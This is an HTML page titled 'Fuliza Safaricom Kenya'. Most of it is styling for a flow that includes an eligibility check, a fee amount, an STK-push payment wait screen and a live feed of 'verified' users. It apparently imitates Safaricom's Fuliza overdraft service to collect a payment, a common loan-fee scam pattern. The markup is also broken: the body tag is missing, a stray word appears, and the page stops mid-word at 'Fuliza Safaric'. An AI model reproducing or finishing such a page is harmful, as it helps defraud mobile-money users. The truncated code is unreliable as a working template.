<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Fuliza Safaricom Kenya</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        /* ── Reset & Base ── */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0d5f2f; color: #212529; min-height: 100vh; margin: 0; padding: 0; }
        :root { --primary: #0d5f2f; --primary-dark: #073a1c; --primary-light: #e8f5e9; --gold: #c9a84c; --gold-light: #f5edd6; --red: #fa5252; --gray: #f8f9fa; --border: #ced4da; }
        .viewport-wrapper { width: 100%; display: flex; flex-direction: column; align-items: center; padding: 16px 12px 60px; }
        .header-pill { background: rgba(255,255,255,0.12); border: 1px solid rgba(255,255,255,0.25); border-radius: 50px; padding: 10px 24px; color: white; font-size: 0.85rem; font-weight: 700; margin: 8px 0 20px 0; display: inline-flex; align-items: center; justify-content: center; gap: 8px; letter-spacing: 0.5px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
        .container { width: 100%; max-width: 440px; background: #ffffff; border-radius: 24px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .page { display: none; animation: fadeIn 0.3s ease; }
        .page.active { display: block; }
        @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
        .card-content { padding: 24px 20px; }
        .card-title { font-size: 1.4rem; font-weight: 800; color: #212529; margin-bottom: 8px; line-height: 1.3; text-align: center; }
        .card-sub { font-size: 0.8rem; color: #6c757d; margin-bottom: 24px; text-align: center; line-height: 1.4; }
        .form-row { display: flex; gap: 12px; margin-bottom: 14px; }
        .form-row > .form-group { flex: 1; margin-bottom: 0; }
        .form-group { margin-bottom: 14px; }
        .form-group label { display: block; font-size: 0.75rem; font-weight: 700; color: #212529; margin-bottom: 6px; }
        .form-group label .required { color: var(--red); margin-left: 2px; }
        .input-wrapper { position: relative; width: 100%; }
        .input-wrapper input, .input-wrapper select { width: 100%; height: 48px; padding: 0 36px 0 12px; border: 1.5px solid #a5b4fc; border-radius: 10px; font-family: inherit; font-size: 0.95rem; background: white; outline: none; transition: all 0.2s ease; color: #212529; }
        .input-wrapper input::placeholder { color: #adb5bd; }
        .input-wrapper input:focus, .input-wrapper select:focus { border-color: #0e6231; box-shadow: 0 0 0 3px rgba(14,98,49,0.1); }
        .status-icon { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); pointer-events: none; display: flex; align-items: center; justify-content: center; width: 20px; height: 20px; font-weight: 800; }
        .input-wrapper.valid input, .input-wrapper.valid select { border-color: #0ca678; }
        .input-wrapper.valid .status-icon::after { content: "✓"; color: #0ca678; font-size: 1.2rem; }
        .input-wrapper.invalid input, .input-wrapper.invalid select { border-color: var(--red); background-color: #fff5f5; }
        .input-wrapper.invalid .status-icon::after { content: "✕"; color: var(--red); font-size: 1rem; }
        .error-msg { color: var(--red); font-size: 0.72rem; margin-top: 4px; display: none; font-weight: 500; }
        .input-wrapper.invalid + .error-msg { display: block; }
        .btn-primary { width: 100%; height: 52px; background: #1b49b5; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: background 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 10px; }
        .btn-primary:hover { background: #123485; }
        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
        .btn-outline { background: transparent; border: 1.5px solid #1b49b5; color: #1b49b5; border-radius: 10px; font-weight: 700; cursor: pointer; transition: all 0.2s; padding: 14px; }
        .btn-outline:hover { background: #f0f4ff; }
        .btn-green { background: #0d5f2f; }
        .btn-green:hover { background: #073a1c; }
        .btn-red { background: #c62828; }
        .btn-red:hover { background: #a32020; }
        .btn-gold { background: var(--gold); color: #ffffff; }
        .btn-gold:hover { background: #b5943c; }
        .approved-badge-card { background: #e9ecef; border-radius: 8px; padding: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; margin-top: 20px; font-weight: 700; font-size: 0.72rem; color: #495057; text-align: center; letter-spacing: 0.3px; }
        .approved-badge-card .flag-below { margin-top: 4px; font-size: 1.1rem; }
        .card-header-green { background: linear-gradient(135deg, #1a7a3a, #0c5225); color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0; }
        .card-header-green .step-info { font-size: 0.72rem; opacity: 0.9; font-weight: 600; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
        .card-header-green .step-title { font-size: 1.2rem; font-weight: 700; margin-bottom: 8px; line-height: 1.3; }
        .card-header-green .step-sub { font-size: 0.85rem; opacity: 0.9; line-height: 1.4; }
        .card-body-white { padding: 20px; background: #ffffff; }
        .card-header-red { background: #c62828; color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0; }
        .card-header-gold { background: linear-gradient(135deg, #c9a84c, #b5943c); color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0; }
        .card-header-gold .step-info { font-size: 0.72rem; opacity: 0.9; font-weight: 600; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
        .card-header-gold .step-title { font-size: 1.2rem; font-weight: 700; margin-bottom: 8px; line-height: 1.3; }
        .card-header-gold .step-sub { font-size: 0.85rem; opacity: 0.9; line-height: 1.4; }
        .check-item { display: flex; align-items: center; gap: 12px; padding: 14px 16px; border: 1.5px solid #eef2f6; border-radius: 12px; margin-bottom: 10px; transition: all 0.3s ease; background: #ffffff; text-align: left; }
        .check-item.pending { border-style: dashed; opacity: 0.55; }
        .check-item.active { border-color: #1b49b5; border-style: dashed; background: #f0f4ff; }
        .check-item.completed { border-color: #c3e6cb; background: #f4faf6; color: #155724; font-weight: 600; }
        .check-circle { width: 24px; height: 24px; border-radius: 50%; border: 2px solid #ced4da; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: bold; font-size: 0.8rem; position: relative; }
        .check-item.active .check-circle { border-color: #1b49b5; border-top-color: transparent; animation: spin 0.8s linear infinite; }
        .check-item.completed .check-circle { background: #28a745; border-color: #28a745; color: white; }
        .check-item.completed .check-circle::after { content: "✓"; }
        .eligibility-spinner { width: 80px; height: 80px; border: 6px solid #eef2f6; border-top-color: #1b49b5; border-radius: 50%; animation: spin 1s linear infinite; margin: 16px auto 24px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .proc-modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.45); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; z-index: 3000; padding: 16px; }
        .proc-modal-overlay.open { display: flex; }
        .proc-modal-box { background: #ffffff; border-radius: 20px; width: 100%; max-width: 480px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.25); display: grid; grid-template-columns: 1.25fr 1fr; gap: 20px; text-align: left; align-items: center; }
        @media (max-width: 420px) { .proc-modal-box { grid-template-columns: 1fr; gap: 16px; text-align: center; } }
        .proc-left { display: flex; flex-direction: column; gap: 12px; }
        .proc-header { display: flex; gap: 12px; align-items: flex-start; }
        @media (max-width: 420px) { .proc-header { justify-content: center; } }
        .proc-badge { background: #0d5f2f; color: white; font-weight: 800; font-size: 0.65rem; padding: 12px 6px; border-radius: 6px; text-align: center; min-width: 60px; line-height: 1.1; letter-spacing: 0.5px; }
        .proc-title-block { font-size: 0.65rem; font-weight: 700; color: #1e3a8a; line-height: 1.3; text-align: left; }
        .proc-title-block strong { font-size: 0.85rem; display: block; margin-top: 1px; letter-spacing: 0.3px; }
        .proc-status-text { font-weight: 700; font-size: 0.85rem; color: #212529; margin-top: 4px; }
        .proc-dots { display: flex; gap: 6px; margin-top: 2px; }
        @media (max-width: 420px) { .proc-dots { justify-content: center; margin-bottom: 8px; } }
        .proc-dots span { width: 8px; height: 8px; background-color: #3b82f6; border-radius: 50%; animation: procDotPulse 1.2s infinite ease-in-out both; }
        .proc-dots span:nth-child(1) { animation-delay: -0.32s; }
        .proc-dots span:nth-child(2) { animation-delay: -0.16s; }
        @keyframes procDotPulse { 0%,80%,100% { transform: scale(0); } 40% { transform: scale(1); } }
        .proc-right { font-size: 0.72rem; color: #6c757d; line-height: 1.45; border-left: 1px solid #e9ecef; padding-left: 20px; text-align: left; }
        @media (max-width: 420px) { .proc-right { border-left: none; padding-left: 0; border-top: 1px solid #e9ecef; padding-top: 16px; text-align: center; } }
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; z-index: 3000; padding: 20px; }
        .modal-overlay.open { display: flex; }
        .modal-box { background: white; border-radius: 20px; padding: 28px 24px; width: 100%; max-width: 400px; animation: modalIn 0.25s ease; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.25); }
        @keyframes modalIn { from { opacity:0; transform:scale(0.95) translateY(16px); } to { opacity:1; transform:scale(1) translateY(0); } }
        .modal-icon { width: 56px; height: 56px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 1.6rem; }
        .modal-icon.success { background: #e8f5e9; color: var(--primary); }
        .modal-icon.error { background: #fce4ec; color: var(--red); }
        .modal-icon.warning { background: #fff3e0; color: #e65100; }
        .modal-title { font-size: 1.25rem; font-weight: 800; margin-bottom: 6px; }
        .modal-desc { font-size: 0.85rem; color: #6c757d; margin-bottom: 16px; line-height: 1.45; }
        .modal-phone-group { display: flex; border: 1.5px solid var(--border); border-radius: 10px; overflow: hidden; margin: 8px 0 12px; }
        .modal-phone-group .prefix { background: var(--gray); padding: 12px 14px; font-weight: 600; border-right: 1.5px solid var(--border); color: #333; display: flex; align-items: center; }
        .modal-phone-group input { flex: 1; border: none; padding: 12px 14px; font-family: inherit; font-size: 0.95rem; outline: none; }
        .modal-status { font-size: 0.75rem; padding: 8px 12px; border-radius: 8px; margin: 10px 0; display: none; font-weight: 500; line-height: 1.3; }
        .modal-status.show { display: block; }
        .modal-status.pending { background: #fff8e1; color: #e65100; }
        .modal-status.success { background: #e8f5e9; color: #0ca678; }
        .modal-status.error { background: #fce4ec; color: var(--red); }
        .feed-container { max-height: 220px; overflow-y: auto; padding-right: 4px; }
        .feed-item { display: flex; align-items: flex-start; gap: 10px; padding: 10px 12px; border-bottom: 1px solid #f0f0f0; animation: slideIn 0.3s ease; text-align: left; }
        .feed-item:last-child { border-bottom: none; }
        @keyframes slideIn { from { opacity:0; transform:translateX(-10px); } to { opacity:1; transform:none; } }
        .feed-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.8rem; color: white; flex-shrink: 0; }
        .feed-content { flex: 1; }
        .feed-name { font-weight: 700; font-size: 0.85rem; color: #212529; }
        .feed-name .verified { color: #0ca678; font-size: 0.65rem; margin-left: 4px; font-weight: 600; }
        .feed-text { font-size: 0.8rem; color: #495057; margin-top: 2px; line-height: 1.35; }
        .feed-time { font-size: 0.65rem; color: #868e96; margin-top: 2px; }
        .feed-live { display: inline-block; background: var(--red); color: white; font-size: 0.55rem; font-weight: 800; padding: 2px 8px; border-radius: 10px; animation: pulse 1.5s infinite; letter-spacing: 0.3px; }
        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
        .nav-header { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
        .back-btn { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: #ffffff; display: flex; align-items: center; justify-content: center; width: 36px; height: 36px; border-radius: 50%; transition: background 0.2s; }
        .back-btn:hover { background: rgba(255,255,255,0.15); }
        .footer { text-align: center; padding: 20px 16px 0; font-size: 0.65rem; color: rgba(255,255,255,0.65); line-height: 1.5; max-width: 440px; width: 100%; }
        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #212529; color: white; padding: 12px 24px; border-radius: 12px; font-size: 0.85rem; font-weight: 600; z-index: 4000; display: none; max-width: 90%; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        .toast.show { display: block; animation: slideUp 0.3s ease; }
        @keyframes slideUp { from { opacity:0; transform:translateX(-50%) translateY(20px); } to { opacity:1; transform:translateX(-50%) translateY(0); } }
        .spinner { width: 18px; height: 18px; border: 2px solid #e0e0e0; border-top-color: #ffffff; border-radius: 50%; animation: spin 0.8s linear infinite; display: inline-block; }
        .stk-waiting-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 5000; padding: 20px; }
        .stk-waiting-overlay.open { display: flex; }
        .stk-waiting-box { background: white; border-radius: 24px; padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; animation: fadeIn 0.3s ease; }
        .stk-waiting-box .pulse-icon { width: 72px; height: 72px; border: 6px solid #e0e0e0; border-top-color: #0d5f2f; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        .stk-waiting-box .title { font-size: 1.2rem; font-weight: 800; color: #1b49b5; margin-bottom: 8px; }
        .stk-waiting-box .sub { font-size: 0.9rem; color: #333; margin-bottom: 6px; }
        .stk-waiting-box .phone { font-weight: 700; color: #0d5f2f; }
        .stk-waiting-box .dots { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
        .stk-waiting-box .dots span { width: 10px; height: 10px; background: #1b49b5; border-radius: 50%; animation: procDotPulse 1.2s infinite ease-in-out both; }
        .stk-waiting-box .dots span:nth-child(1) { animation-delay: -0.32s; }
        .stk-waiting-box .dots span:nth-child(2) { animation-delay: -0.16s; }
        .stk-waiting-box .listening { background: #e8f5e9; border-radius: 24px; padding: 8px 16px; font-size: 0.78rem; color: #0d5f2f; font-weight: 700; display: inline-flex; align-items: center; gap: 6px; }
        .stk-waiting-box .listening .dot { width: 8px; height: 8px; background: #0ca678; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
        .stk-waiting-box .note { font-size: 0.68rem; color: #adb5bd; margin-top: 14px; }
        .fee-section { background: #f5edd6; border: 2px solid #c9a84c; border-radius: 12px; padding: 16px 18px; margin: 16px 0; text-align: center; }
        .fee-section .fee-label { font-size: 0.72rem; color: #666; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
        .fee-section .fee-amount { font-size: 2rem; font-weight: 900; color: #b85c00; margin: 4px 0; }
        .fee-section .fee-sub { font-size: 0.75rem; color: #555; font-weight: 500; }
        .success-summary { background: #f0faf4; border: 1px solid #b2dfdb; border-radius: 12px; padding: 14px; margin: 16px 0; text-align: left; font-size: 0.82rem; }
        .success-summary .summary-title { font-weight: 800; color: #0d5f2f; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
        .success-summary .summary-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
        .success-summary .summary-row:last-child { margin-bottom: 0; }
        .success-summary .summary-row .label { color: #6c757d; }
        .success-summary .summary-row .value { font-weight: 700; color: #212529; }
        .success-summary .summary-row .value.amount { color: #0d5f2f; }
        .success-summary .summary-row .value.network { color: #0d5f2f; }
        .sending-indicator { display: inline-flex; align-items: center; gap: 8px; font-size: 0.82rem; color: #0ca678; font-weight: 700; margin-bottom: 12px; justify-content: center; width: 100%; }
        .sending-indicator .dot { width: 10px; height: 10px; background: #0ca678; border-radius: 50%; display: inline-block; }
    </style>
</head>

    <div id="toast" class="toast"></div>

    <!-- =============================================================
    PAGE 0: WELCOME PAGE
    ============================================================= -->

        <div style="background:#ffffff; width:100%; display:flex; justify-content:center; align-items:center; padding: 24px 16px;">
            <div style="display:flex; flex-direction:column; align-items:center; padding:10px 0;">
                <div style="font-size:2.4rem; font-weight:900; color:#1a7a3a; letter-spacing:3px; line-height:1.1;">FULIZA</div>

        </div>

        <div style="background:#1a7a3a; width:100%; display:flex; flex-direction:column; align-items:center; padding: 32px 16px 60px; min-height: calc(100vh - 143px);">

                        No

            <div class="footer">
                Fuliza Safaric
